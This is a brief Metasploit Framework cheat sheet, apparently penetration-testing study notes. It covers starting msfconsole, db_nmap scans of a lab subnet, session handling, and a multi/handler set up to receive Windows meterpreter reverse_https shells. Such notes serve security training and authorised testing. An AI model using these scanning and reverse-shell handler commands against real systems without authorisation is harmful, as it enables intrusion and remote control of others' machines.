Metasploit - Basics

msfconsole – This is an interactive console interface which is most commonly used to run regular tasks.
armitage - a third party add-on to the MSF providing a graphical user interface to the MSF.




Start the postgresql service (MSF dependant on it): root@kali:~# systemctl start postgresql

Start the postgresql service on boot: root@kali:~# systemctl enable postgresql



Start the metasploit framework: root@kali:~# msfconsole

Show help: msf > show -h



Display all hosts in the postgresql database: msf > hosts

Nmap scan hosts and inset the scan output into the msf database: msf > db_nmap 10.11.1.1-254

Search the database for machines with specific ports open: msf > services -p 443

set the rhosts value to the targets that have port 443 open: 

msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > services -p 443 --rhosts




Show all the sessions: msf > sessions

background the current meterpreter session: meterpreter > background

Return to a backgrounded session: sessions -i 1





Multi-Handler

Info:

The MSF multi handler module can accept various incoming payloads and handles them correctly - including single and multi-stage payloads. 

Commands: 

msf > use exploit/multi/handler

msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https

msf exploit(handler) > show options

msf exploit(handler) > exploit














